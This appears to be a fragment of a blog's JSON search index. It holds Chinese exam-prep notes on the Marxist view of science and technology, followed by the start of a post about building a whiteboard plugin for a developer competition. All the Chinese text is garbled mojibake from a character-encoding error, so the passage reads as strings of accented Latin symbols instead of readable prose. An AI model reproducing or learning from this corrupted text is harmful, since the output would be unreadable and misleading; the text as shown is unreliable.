2.å¦‚ä½•çœ‹å¾…ç§‘å­¦æŠ€æœ¯å¯¹äººçš„å¼‚åŒ–å’Œå¯¹è‡ªç„¶çš„å¼‚åŒ–ï¼Ÿ ç§‘æŠ€å¼‚åŒ–å®è´¨ä¸Šæ˜¯åœ¨èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦ä¸‹åŠ³åŠ¨å¼‚åŒ–å’Œäººçš„å¼‚åŒ–ä¸€ç§å¿…ç„¶ç»“æœã€‚ç”±äºåŠ³åŠ¨æ˜¯äººçš„æœ€æ ¹æœ¬æœ€ç°å®çš„å®è·µæ´»åŠ¨ï¼Œæ˜¯äººåŠäººç±»ç¤¾ä¼šå­˜åœ¨çš„æ ¹æœ¬æ–¹å¼ï¼ŒåŠ³åŠ¨çš„å¼‚åŒ–å¿…ç„¶å¸¦æ¥äººçš„å…¶ä»–ç¤¾ä¼šæ´»åŠ¨å’Œç¤¾ä¼šå…³ç³»çš„å…¨é¢å¼‚åŒ–ï¼Œç§‘å­¦æŠ€æœ¯ä¹Ÿä¸ä¾‹å¤–ï¼Œå› ä¸ºâ€œå®—æ•™ã€å®¶åº­ã€å›½å®¶ã€æ³•ã€é“å¾·ã€ç§‘å­¦ã€è‰ºæœ¯ç­‰ç­‰ï¼Œéƒ½ä¸è¿‡æ˜¯ç”Ÿäº§çš„ä¸€äº›ç‰¹æ®Šçš„æ–¹å¼ï¼Œå¹¶ä¸”å—ç”Ÿäº§çš„æ™®éè§„å¾‹çš„æ”¯é…ã€‚â€ å› æ­¤ï¼Œç§‘å­¦æŠ€æœ¯ä½œä¸ºåŠ³åŠ¨äº¦å³äººå¤„ç†è‡ªèº«ä¸è‡ªç„¶ç•Œå…³ç³»çš„ç¤¾ä¼šæ´»åŠ¨çš„äº§ç‰©ï¼Œä¹Ÿå¿…ç„¶éšç€èµ„æœ¬ä¸»ä¹‰ç¤¾ä¼šåŠ³åŠ¨çš„å¼‚åŒ–è€Œè¡¨ç°å‡ºå¼‚åŒ–çš„ç°è±¡ã€‚æœ€æ ¹æœ¬çš„æ˜¯è¦æ¶ˆç­å¯¹ç§‘å­¦æŠ€æœ¯çš„èµ„æœ¬ä¸»ä¹‰åˆ©ç”¨æ–¹å¼ï¼ŒæŠŠç°ä»£ç§‘å­¦æŠ€æœ¯ä»èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦ä¸‹è§£æ”¾å‡ºæ¥ã€‚ä¹Ÿå°±æ˜¯è¯´åªæœ‰é€šè¿‡æ— äº§é˜¶çº§é©å‘½æ¥æœ€ç»ˆè§£å†³èµ„æœ¬ä¸»ä¹‰çš„ç§‘æŠ€å¼‚åŒ–é—®é¢˜ã€‚å½“ç„¶ï¼Œåœ¨é©¬å…‹æ€çœ‹æ¥ï¼Œå¼‚åŒ–çš„å®Œå…¨å…‹æœåªæœ‰åœ¨å…±äº§ä¸»ä¹‰ç¤¾ä¼šåˆ¶åº¦ä¸­æ‰èƒ½æœ€ç»ˆå®ç°ã€‚ 3.ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶å’Œç»„ç»‡æœºæ„å¯¹ç§‘å­¦æŠ€æœ¯çš„å‘å±•æœ‰ä½•æ„ä¹‰ï¼Ÿ ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šå»ºåˆ¶æœ‰ä¸€ä¸ªå†å²è¿‡ç¨‹ã€‚ç»æµæ”¯æŒåˆ¶åº¦ã€æ³•å¾‹ä¿éšœä½“ç³»ç­‰ç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ˜¯æ ¹æœ¬ï¼Œå„ç§ç»„ç»‡æœºæ„åŠå…¶ç§‘ç ”ç»„ç»‡è¿è¡Œæ˜¯ä¿è¯ï¼Œç§‘å­¦æŠ€æœ¯çš„ä¼¦ç†è§„èŒƒæ˜¯å¯¼å¼•ã€‚åœ¨ç§‘å­¦æŠ€æœ¯å‘å±•åº”ç”¨çš„æ–°é˜¶æ®µï¼Œç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šå»ºåˆ¶å‘ˆç°å‡ºä¸€äº›æ–°ç‰¹ç‚¹ï¼Œå› æ­¤å¿…é¡»è¿›è¡Œç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ”¹é©ï¼Œä»¥ä¿è¯ç§‘å­¦æŠ€æœ¯çš„è‰¯å¥½è¿è¡Œã€‚ ä½œä¸ºç¤¾ä¼šå»ºåˆ¶çš„ç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ˜¯åœ¨ä¸€å®šç¤¾ä¼šä»·å€¼è§‚å¿µæ”¯é…ä¸‹ï¼Œä¾æ®ç›¸åº”çš„ç‰©è´¨è®¾å¤‡æ¡ä»¶å½¢æˆçš„ä¸€ç§ç¤¾ä¼šç»„ç»‡åˆ¶åº¦ï¼Œæ—¨åœ¨æ”¯æŒæ¨åŠ¨äººç±»å¯¹è‡ªç„¶çš„è®¤è¯†å’Œåˆ©ç”¨ã€‚ç§‘å­¦æŠ€æœ¯çš„ä½“åˆ¶åŒ–ä»¥ç›¸åº”çš„èŒä¸šåŒ–ä¸ºæ ¸å¿ƒï¼Œå…¶å†…æ¶µéšç€ç§‘å­¦æŠ€æœ¯çš„å‘å±•è€Œä¸æ–­æ‹“å±•å’Œä¸°å¯Œã€‚ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ…æ‹¬:ç»„ç»‡é¢†å¯¼ä½“åˆ¶ã€ç»æµæ”¯æŒåˆ¶åº¦ã€æ³•å¾‹ä¿éšœä½“åˆ¶ã€äº¤æµä¸ä¼ æ’­ä½“åˆ¶ã€äººæ‰æ•™è‚²åŸ¹å…»åˆ¶åº¦ç­‰ã€‚ç§‘å­¦æŠ€æœ¯ä¸å…¶ä»–å„ç§äº‹ä¸šå¯†åˆ‡ç›¸å…³,éœ€è¦å»ºç«‹ç›¸åº”çš„ç»„ç»‡æœºæ„ä»¥ä¿è¯ç§‘å­¦æŠ€æœ¯æ´»åŠ¨çš„é¡ºåˆ©è¿›è¡Œã€‚ç§‘å­¦æŠ€æœ¯ç»„ç»‡æœºæ„éšç€å†å²çš„æ¼”åŒ–è€Œå˜åŒ–ï¼Œå…·æœ‰å„ç™½çš„ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼Œæ˜¯å®ç°ç§‘å­¦æŠ€æœ¯ç°ä»£åŒ–çš„ç»„ç»‡ä¿è¯ã€‚åœ¨ç§‘å­¦æŠ€æœ¯ç¤¾ä¼šå²ä¸Šå½¢æˆä¸å‘å±•èµ·æ¥çš„ç»„ç»‡æœºæ„æœ‰:ç§‘å­¦æŠ€æœ¯å†³ç­–ã€ç®¡ç†ä¸å’¨è¯¢æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯æ´»åŠ¨ç»„ç»‡æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯ä¼ æ’­æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯äººæ‰åŸ¹å…»æœºæ„ã€‚ ã€ä»¥ä¸‹æ‘˜ç™½ç™¾åº¦è´´å§å¸–å­â€œç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ–åŠå…¶å¯¹ç§‘å­¦å‘å±•çš„æ„ä¹‰â€ã€‘ ç§‘å­¦æŠ€æœ¯ä½“åˆ¶åŒ–çš„å†…å®¹åŒ…æ‹¬:ç§‘å­¦æŠ€æœ¯çš„æŠ•å…¥ä½“åˆ¶ã€ç§‘æŠ€ç ”ç©¶çš„ç»“æ„æ¯”ä¾‹ã€ç§‘å­¦æŠ€æœ¯çš„æ³•å¾‹åˆ¶åº¦ã€ç§‘æŠ€ç ”ç©¶çš„ç®¡ç†ä½“åˆ¶ã€‚ ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ–å¯¹ç§‘å­¦å‘å±•çš„æ„ä¹‰:1ã€å®ƒå¯ä»¥ç§¯èšç¤¾ä¼šä¸Šçš„åŠ›é‡æ¥è¿›è¡ŒæŸ‘åº”çš„ç§‘å­¦ç ”ç©¶;2ã€å½“ä»£ç§‘æŠ€æ´»åŠ¨çš„ç»“æ„ä¸­åŸºç¡€ç ”ç©¶å°†ä¼šæœ‰å¤§é‡çš„äººå‘˜å‚lä¸j;3ã€æ˜ç¡®çš„æ³•å¾‹ä»¥åŠç®¡ç†åˆ¶åº¦å°†ä¼šæ›´è¿›ä¸€æ­¥ä¿ƒè¿›ç§‘å­¦æŠ€æœ¯çš„å‘å±•ã€‚ 4.ä¸ºä»€ä¹ˆè¦å¯¹ç§‘å­¦æŠ€æœ¯å·¥ä½œè€…è¿›è¡Œä¼¦ç†è§„èŒƒï¼Ÿ ç§‘å­¦æŠ€æœ¯æ´»åŠ¨ä¸äººç±»å…¶ä»–æ´»åŠ¨ä¸€æ ·ï¼Œå»ºç«‹åœ¨è¯šä¿¡å’Œé“å¾·çš„åŸºç¡€ä¸Šã€‚ç°é˜¶æ®µï¼Œé»˜é¡¿çš„ç§‘å­¦çš„ç²¾ç¥æ°”è´¨å—åˆ°æŒ‘æˆ˜ï¼Œç§‘å­¦æŠ€æœ¯å·¥ä½œè€…æœ‰å¤±èŒƒè¡Œä¸ºï¼Œéœ€è¦åˆ¶å®šç›¸å…³ç§‘ç ”è¯šä¿¡æŒ‡å—å’Œå·¥ç¨‹å¸ˆä¼¦ç†å‡†åˆ™åŠ ä»¥è§„èŒƒã€‚ç§‘å­¦å·¥ä½œè€…è¿›è¡Œç§‘å­¦ç ”ç©¶å’ŒåŒ»å­¦å®è·µï¼Œå°¤å…¶æ˜¯è¿›è¡Œäººä½“å®éªŒå’ŒåŠ¨ç‰©å®éªŒï¼Œåº”è¯¥éµå¾ªç¤¾ä¼šä¼¦ç†ã€ç”Ÿå‘½ä¼¦ç†ã€åŠ¨ç‰©ä¼¦ç†ç­‰ã€‚æŠ€æœ¯å·¥ä½œè€…ï¼Œå°¤å…¶æ˜¯å·¥ç¨‹å¸ˆï¼Œåœ¨å·¥ç¨‹æŠ€æœ¯æ´»åŠ¨ä¸­ï¼Œåº”è¯¥éµå¾ªä¸€å®šçš„èŒä¸šä¼¦ç†å’Œç¤¾ä¼šä¼¦ç†å‡†åˆ™ï¼Œåº”è¯¥æ‰¿æ‹…å¯¹ç¤¾ä¼šã€ä¸“ä¸šã€é›‡ä¸»å’ŒåŒäº‹çš„è´£ä»»ï¼Œåº”è¯¥å¯¹å·¥ç¨‹çš„ç¯å¢ƒå½±å“è´Ÿæœ‰ç‰¹åˆ«çš„è´£ä»»ï¼Œè§„èŒƒç™½å·±çš„è¡Œä¸ºï¼Œä¸ºäººç±»ç¦ç¥‰å’Œç¯å¢ƒä¿æŠ¤æœåŠ¡ã€‚ 5.å¦‚ä½•ç†è§£ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–ä¹‹é—´çš„å†²çªä¸åè°ƒï¼Ÿ (ä¸€ï¼‰ç¤¾ä¼šæ–‡åŒ–å¯¹ç§‘å­¦æŠ€æœ¯çš„å½±å“ ç§‘å­¦æŠ€æœ¯çš„äº§ç”Ÿå’Œå‘å±•éœ€è¦ä¸€å®šçš„ç¤¾ä¼šæ–‡åŒ–ç¯å¢ƒã€‚ç¤¾ä¼šæ–‡åŒ–ä¸ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ç´§å¯†å…³è”ï¼Œå¹¶ç”±æ­¤å½±å“ç§‘å­¦æŠ€æœ¯çš„å‘å±•åŠå…¶åº”ç”¨ã€‚é»˜é¡¿åœ¨ã€Šåä¸ƒä¸–çºªè‹±æ ¼å…°çš„ç§‘å­¦ã€æŠ€æœ¯ä¸ç¤¾ä¼šã€‹ä¸­æå‡ºçš„â€œæ¸…æ•™ä¸»ä¹‰ä¿ƒè¿›è‹±å›½è¿‘ä»£ç§‘å­¦çš„åˆ¶åº¦å˜åŒ–â€ï¼Œä»¥åŠâ€œæçº¦ç‘Ÿéš¾é¢˜â€â€”â€”â€œè¿‘ä»£ç§‘å­¦ä¸ºä»€ä¹ˆæ²¡æœ‰åœ¨ä¸­å›½è¯ç”Ÿâ€çš„è§£ç­”ï¼Œå°±è¯´æ˜äº†è¿™ä¸€ç‚¹ã€‚ (äºŒï¼‰ç§‘å­¦æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–çš„åè°ƒ 1ï¼è¦é˜²æ­¢ç§‘å­¦åœ¨ç”Ÿæ´»ä¸–ç•Œã€è‡ªç„¶ä¸–ç•Œå¯¹äººæ–‡çš„åƒ­è¶Šæ‰€é€ æˆçš„ç§‘å­¦æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–ä¹‹é—´çš„å†²çªï¼Œæ·±åˆ»ç†è§£ç§‘å­¦çš„é™åº¦ï¼Œç”¨æ­£ç¡®çš„äººæ–‡ç†å¿µæŒ‡å¯¼æˆ‘ä»¬çš„ç”Ÿæ´»ã€‚ 2ï¼å¿…é¡»ä»¥ç¤¾ä¼šå…ˆè¿›æ–‡åŒ–æ¥å¼•é¢†ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ï¼Œä½¿ç§‘å­¦æŠ€æœ¯å‘å±•å’Œåº”ç”¨ä¸ºç»æµç¤¾ä¼šå¥åº·å…¨é¢å‘å±•æœåŠ¡ã€‚å¾—åˆ°å¹¿æ³›æå€¡çš„ç¯å¢ƒç§‘å­¦æŠ€æœ¯å°±æ˜¯ä¸ºäº†åè°ƒäººä¸è‡ªç„¶ä¹‹é—´çš„å…³ç³»æ‰€åšçš„åŠªåŠ›ï¼Œæ˜¯ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–â€”â€”ç»¿è‰²æ–‡åŒ–çš„è‰¯æ€§äº’åŠ¨äº§ç‰©ã€‚ 6.ç§‘å­¦æŠ€æœ¯çš„é£é™©æœ‰å“ªäº›ï¼Ÿå¦‚ä½•æ°å½“åœ°è¿›è¡Œç§‘å­¦æŠ€æœ¯é£é™©è¯„ä»·ä¸å†³ç­–ï¼Ÿ ç§‘å­¦æŠ€æœ¯çš„é£é™©åŒ…æ‹¬ç¯å¢ƒé£é™©ã€æ”¿æ²»é£é™©ã€ç»æµé£é™©ã€å¥åº·é£é™©å’Œä¼¦ç†é£é™©ç­‰ã€‚è¿™äº›é£é™©ä¼šå¼•å‘ä¸€ç³»åˆ—äº‰è®ºï¼Œé€ æˆè¯„ä»·å’Œå†³ç­–ä¸Šçš„å›°éš¾ã€‚ä¹ è¿‘å¹³æŒ‡å‡º:â€œè¦åŠ å¿«å»ºç«‹ç§‘æŠ€å’¨è¯¢æ”¯æ’‘è¡Œæ”¿å†³ç­–çš„ç§‘æŠ€å†³ç­–æœºåˆ¶ï¼ŒåŠ å¼ºç§‘æŠ€å†³ç­–å’¨è¯¢ç³»ç»Ÿï¼Œå»ºè®¾é«˜æ°´å¹³ç§‘æŠ€æ™ºåº“ã€‚è¦åŠ å¿«æ¨è¿›é‡å¤§ç§‘æŠ€å†³ç­–åˆ¶åº¦åŒ–ï¼Œè§£å†³å¥½å®é™…å­˜åœ¨çš„éƒ¨é—¨é¢†å¯¼æ‹è„‘è¢‹ã€ç§‘æŠ€ä¸“å®¶çœ‹é¢œè‰²è¡Œäº‹ç­‰é—®é¢˜ã€‚â€ è¦æ°å½“è¿›è¡Œç§‘å­¦æŠ€æœ¯é£é™©è¯„ä»·ä¸å†³ç­–ï¼Œå°±åº”è¯¥å…¨é¢è¯„ä»·ç§‘å­¦æŠ€æœ¯é£é™©â€”æ”¶ç›Šçš„å¤šä¸ªæ–¹é¢ï¼Œæ‰¹åˆ¤æ€§åœ°è€ƒå¯Ÿâ€œå†…éƒ¨&quot;å­˜æœ‰äº‰è®®çš„ç§‘å­¦çŸ¥è¯†æˆ–æŠ€æœ¯çŸ¥è¯†ï¼Œåˆ†æç›¸äº’ç«äº‰çš„åˆ©ç›Šé›†å›¢å’Œç¤¾ä¼šç»“æ„çš„&quot;å¤–éƒ¨&quot;æ”¿æ²»å­¦ï¼Œç†è§£ç§‘å­¦æŠ€æœ¯ä¸“å®¶çŸ¥è¯†å’Œå†³ç­–çš„å±€é™æ€§ã€å…¬ä¼—ç†è§£ç§‘å­¦çš„å¿…è¦æ€§ä»¥åŠå¤–è¡ŒçŸ¥è¯†çš„ä¼˜åŠ¿ï¼Œæ˜ç¡®æ”¿åºœã€ç§‘å­¦æŠ€æœ¯ä¸“å®¶ä»¥åŠå…¬ä¼—åœ¨ä¸ç§‘å­¦æŠ€æœ¯é£é™©ç›¸å…³çš„å…¬å…±å†³ç­–ä¸­çš„ä¸åŒä½œç”¨ï¼Œç¡®ç«‹å…¬ä¼—å‚ä¸å†³ç­–çš„å¯èƒ½æ–¹å¼ï¼Œä»è€Œå½¢æˆæœ€ä¼˜åŒ–çš„ç§‘å­¦æŠ€æœ¯å…¬å…±æ”¿ç­–æ¨¡å¼ï¼Œä»¥è¾¾åˆ°å¯¹ç§‘å­¦æŠ€æœ¯é£é™©ç¤¾ä¼šæœ‰æ•ˆæ²»ç†çš„ç›®çš„ã€‚ ç¬¬äº”ç«  ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ 1.ä¸ºä»€ä¹ˆè¯´æ–°æ—¶ä»£ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯æ˜¯ä¸€ä¸ªç§‘å­¦ã€å®Œæ•´çš„æ€æƒ³ç†è®ºä½“ç³»ï¼Ÿ æ¯›æ³½ä¸œã€é‚“å°å¹³ã€â€¦â€¦ã€èƒ¡é”¦æ¶›ã€ä¹ è¿‘å¹³çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼Œæ˜¯åœ¨ä¸­å›½å…±äº§å…šé¢†å¯¼æˆ‘å›½ç§‘å­¦æŠ€æœ¯äº‹ä¸šå‘å±•å’Œè¿›è¡Œç¤¾ä¼šä¸»ä¹‰ç°ä»£åŒ–å»ºè®¾çš„ä¼Ÿå¤§æ—¶é—´ä¸­ï¼Œé€æ¸å½¢æˆã€å‘å±•å’Œå®Œå–„çš„ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ˜¯åŸºäºé©¬å…‹æ€ã€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼Œå¯¹å½“ä»£ç§‘å­¦æŠ€æœ¯æœºå™¨å‘å±•è§„å¾‹çš„æ¦‚æ‹¬å’Œæ€»ç»“ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è®ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ˜¯ä¸­å›½å…±äº§å…šäººé›†ä½“æ™ºæ…§çš„ç»“æ™¶ï¼Œæ˜¯å¯¹æ¯›æ³½ä¸œã€é‚“å°å¹³ã€â€¦â€¦ã€ä¹ è¿‘å¹³ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„æ¦‚æ‹¬å’Œæ€»ç»“ï¼Œæ˜¯ä»–ä»¬ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„ç†è®ºå‡åå’Œé£è·ƒï¼Œæ˜¯ä»–ä»¬ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„å‡ç»ƒå’Œç²¾é«“ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„å†…å®¹ä¸°å¯Œï¼Œæ¶‰åŠäº†ç§‘å­¦æŠ€æœ¯çš„åŠŸèƒ½ã€ç›®æ ‡ã€æœºåˆ¶ã€æˆ˜ç•¥ã€äººæ‰å’Œæ–¹é’ˆç­‰é‡å¤§é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªç§‘å­¦ã€å®Œæ•´çš„æ€æƒ³ç†è®ºä½“ç³»ã€‚ 2.å¦‚ä½•ç†è§£ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„ç†è®ºç²¾é«“ï¼Ÿ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ¦‚æ‹¬å’Œæ€»ç»“äº†æ¯›æ³½ä¸œã€é‚“å°å¹³ã€Â·Â·Â·ã€ä¹ è¿‘å¹³ç­‰çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼ŒåŒ…æ‹¬ç§‘å­¦æŠ€æœ¯çš„åŠŸèƒ½è§‚ã€æˆ˜ç•¥è§‚ã€äººæ‰è§‚ã€å’Œè°è§‚å’Œåˆ›æ–°è§‚çš„åŸºæœ¨å†…å®¹ï¼Œä½“ç°å‡ºæ—¶ä»£æ€§ã€å®è·µæ€§ã€ç§‘å­¦æ€§ã€åˆ›æ–°æ€§ã€è‡ªä¸»æ€§ã€äººæœ¬æ€§ç­‰ç‰¹å¾ï¼Œå»ºè®¾ä¸­å›½ç‰¹è‰²çš„åˆ›æ–°å‹å›½å®¶ï¼Œæ˜¯ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„å…·ä½“ä½“ç°ã€‚ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ä¸ä¸­å›½å…·ä½“ç§‘å­¦æŠ€æœ¯å®è·µç›¸ç»“åˆçš„äº§ç‰©ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è®ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ 3.å¦‚ä½•ç†è§£ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰æ€æƒ³ä¸­çš„ç§‘å­¦æŠ€æœ¯è§‚çš„æ—¶ä»£æ„ä¹‰ï¼Ÿ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„ä¸‰ä¸ªå†å²é˜¶æ®µæ˜¯å…¶å„è‡ªæ‰€å¤„çš„å†å²æ¡ä»¶æ‰€å†³å®šçš„ï¼Œæ˜¯å¯¹æ—¶ä»£èƒŒæ™¯å®äº‹æ±‚æ˜¯çš„åæ˜ ï¼Œå› æ­¤ç§‘å­¦æŠ€æœ¯æ€æƒ³éƒ½é•Œåˆ»äº†æ—¶ä»£çš„çƒ™å°ï¼Œåæ˜ äº†æ—¶ä»£çš„éœ€æ±‚ã€‚ ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰æ€æƒ³ä¸­çš„ç§‘å­¦æŠ€æœ¯è§‚ï¼Œæ˜¯åœ¨ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰è¿›å…¥æ–°æ—¶ä»£çš„å†å²æ¡ä»¶ä¸‹å½¢æˆçš„ã€‚æ–°æ—¶ä»£ä¹‹â€œæ–°&quot;ï¼Œä¸€æ˜¯åœ¨äºæˆ‘ä»¬è¿›å…¥äº†ä¸€ä¸ªæ–°çš„å‘å±•é˜¶æ®µï¼Œå‘å±•ç¯å¢ƒã€å‘å±•æ¡ä»¶éƒ½å‘ç”Ÿäº†æ–°çš„å˜åŒ–ï¼Œç›®æ ‡ä»»åŠ¡ä¹Ÿå‘ç”Ÿäº†æ–°çš„å˜åŒ–;äºŒæ˜¯åœ¨äºæˆ‘ä»¬é¢ä¸´ç€æ–°çš„ç¤¾ä¼šä¸»ä¹‰ä¸»è¦çŸ›ç›¾;ä¸‰æ˜¯æˆ‘ä»¬è¿ˆå‘æ–°çš„å¥‹æ–—ç›®æ ‡ã€‚æ­£æ˜¯åŸºäºè¿™ä¸€æ–°æ—¶ä»£çš„&quot;æ–°&quot;ç‰¹å¾æ—¶ä»£èƒŒæ™¯ï¼Œä¹ è¿‘å¹³ç«‹è¶³äºæˆ‘è´µå“¦ç§‘å­¦æŠ€æœ¯ä¸ç¤¾ä¼šå‘å±•çš„ç°å®éœ€è¦ï¼Œæå‡ºäº†ä¸€ç³»åˆ—å…³äºç§‘å­¦æŠ€æœ¯å‘å±•çš„ç†è®ºè§‚ç‚¹ï¼Œå½¢æˆäº†ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ã€‚","tags":[{"name":"è€ƒç ”","slug":"è€ƒç ”","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94/"},{"name":"è€ƒç ”/æ”¿æ²»","slug":"è€ƒç ”-æ”¿æ²»","permalink":"https://hodlyounger.github.io/tags/%E8%80%83%E7%A0%94-%E6%94%BF%E6%B2%BB/"}],"categories":[{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"å£°ç½‘å‚èµ›ç»å†è®°å½•â€”â€”ç™½æ¿æ’ä»¶å¼€å‘(å‰ç«¯)","date":"2023-10-27T01:24:02.561Z","path":"Z_æ‚è®°/å£°ç½‘å‚èµ›åˆ†äº«/","text":"[toc] # æ¯”èµ›åˆ›æ„ æœ€å¼€å§‹è®¨è®ºçš„ç»“æœæ—¶åšä¸€ä¸ªä¼šè®®è®°å½•ç›¸å…³çš„æ’ä»¶ï¼Œç»“åˆå£°æœ›åŸæœ¬æä¾›çš„ç™½æ¿æ’ä»¶åŠŸèƒ½ï¼Œå¯ä»¥å®æ—¶çš„è¿›è¡Œå±•ç¤ºï¼Œå¤šäººæ“ä½œã€äº’åŠ¨ï¼ŒéŸ³è§†é¢‘é€šè¯ã€‚åŒºåˆ«äºç°æœ‰ä¼šè®®æ¨¡å¼çš„ä¸€ç‚¹å°±æ˜¯ï¼Œé™¤äº†éŸ³è§†é¢‘é€šè¯ï¼Œè¿˜å¯ä»¥åœ¨é€šè¯çš„åŒæ—¶ï¼Œåœ¨ç™½æ¿ä¸Šè¿›è¡Œæ“ä½œï¼Œç±»ä¼¼äºWebä¸Š åœ¨çº¿æ–‡æ¡£ã€åœ¨çº¿ä¼šè®®ã€åœ¨çº¿ç”»æ¿ ä¸‰è€…åŠŸèƒ½é›†ä¸€èº«çš„ä¸€æ¬¾ç™½æ¿æ’ä»¶ï¼Œå½“ç„¶è¿™é‡Œåœ¨çº¿ç™½æ¿çš„åŠŸèƒ½æ˜¯ç”±å£°æœ›çš„ SDK æä¾›äº†è¿™ä¸ªèƒ½åŠ›ï¼Œåœ¨çº¿æ–‡æ¡£çš„è¿™äº›å…·ä½“çš„åœ¨çº¿åŒæ­¥çš„é€»è¾‘è¿˜æ˜¯è¦ä»¥å£°æœ›æä¾›çš„ä¸ºåŸºå‡†ã€‚ 1. æœ€ç»ˆç»“æœ æœ€ç»ˆç”±äºæˆ‘ä»¬äººåŠ›æœ‰é™ï¼Œå¹¶ä¸”éƒ½æ˜¯å…¼èŒå‚åŠ æ¯”èµ›ï¼Œæ‰€ä»¥å®Œæˆä¸Šæ˜¯å¤§æ‰“æŠ˜æ‰£ã€‚ è°ƒç”¨äº†è®¯é£çš„å®æ—¶è¯­éŸ³è¯†åˆ«æ¥å£å®ç°äº†æ’ä»¶çš„ è¯­éŸ³è½¬å†™ åŠŸèƒ½ï¼Œå¯ä»¥è¿›è¡Œå¤šäººè¯­éŸ³è¯†åˆ«åˆ°æ’ä»¶å†…éƒ¨ å¯ä»¥å¯¹ä¼šè®®å†…å®¹å’Œè¯†åˆ«è®°å½•è¿›è¡Œ ä¸€é”®å¯¼å‡º çš„åŠŸèƒ½ æœ€åå‘¢ï¼Œç”±äºå®ç°çš„åŠŸèƒ½è¿‡äºå•è°ƒï¼Œåˆæ–°å¢äº†ä¸€ä¸ª Markdown çš„ç¼–è¾‘å™¨ï¼Œæ’ä»¶å¯åŠ¨åå¯ä»¥ç¼–è¾‘ï¼Œä½†æ˜¯è¿™ä¸ªå†…å®¹æ˜¯ä¸åŒæ­¥çš„ã€‚ # æŠ€æœ¯æ€»ç»“ æ€»ç»“ä¸€ä¸‹æˆ‘ä¸ªäººåœ¨æ¯”èµ›ä¸­å­¦ä¹ å’Œä½¿ç”¨åˆ°çš„ä¸€äº›æŠ€æœ¯ï¼Œç”±äºæˆ‘æœ¬äººæ˜¯ C++å®¢æˆ·ç«¯ å¼€å‘ï¼Œä¹‹å‰è™½ç„¶ä¹Ÿæœ‰å­¦ä¹ è¿‡VUEå’Œå‰ç«¯çŸ¥è¯†ï¼Œä½†æ˜¯ VUE3 çš„æ”¹åŠ¨è¿˜æ˜¯æŒºå¤§ï¼Œä½¿ç”¨èµ·æ¥é¢‡æœ‰äº›ä¸å¤ªä¹ æƒ¯çš„åœ°æ–¹ã€‚ä¸»è¦çš„å‰ç«¯æ¡†æ¶ä»¥åŠä»£ç åŠŸèƒ½éƒ½æ˜¯ç”±æˆ‘æ¯”èµ›çš„é˜Ÿå‹å»å®Œæˆçš„ã€‚æˆ‘è´Ÿè´£åå°æ•°æ®ç›¸å…³çš„ä¸€äº›å·¥ä½œã€‚ä¸»è¦é¢å‘äºéŸ³è§†é¢‘å½•åˆ¶ã€å­˜å‚¨ã€å‘é€ç­‰ï¼Œä»¥åŠè°ƒç”¨è¯­éŸ³è¯†åˆ«æ¥å£ã€‚ 